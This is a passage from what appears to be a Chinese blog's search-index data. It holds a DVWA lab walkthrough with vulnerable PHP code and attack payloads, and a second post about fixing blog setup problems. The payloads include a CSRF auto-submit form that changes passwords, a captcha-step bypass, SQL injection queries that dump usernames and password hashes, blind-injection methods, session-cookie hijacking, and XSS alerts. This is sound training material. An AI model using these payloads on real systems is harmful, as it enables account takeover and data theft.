/&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } //当验证码检查通过 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_REQUEST[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) { $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1=1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1=1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ 6.爆数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_GET[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 没有找到用户，返回一个错误页面 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 客户端返回的错误提示 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { //如果没有session id则将session id设为0 if (!isset ($_SESSION[&apos;last_session_id&apos;])) { $_SESSION[&apos;last_session_id&apos;] = 0; } //累加session id $_SESSION[&apos;last_session_id&apos;]++; $cookie_value = $_SESSION[&apos;last_session_id&apos;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]=”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 反馈给用户 echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { //获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T03:51:37.336Z","updated":"2018-07-13T11:12:03.026Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到/source这个目录里面Github只会上传/source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018/7/7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 持续更新中~","categories":[{"name":"其他","slug":"其他","permalink":"https://perfect.xyz/categories/其他/"}],"tags":[]}]}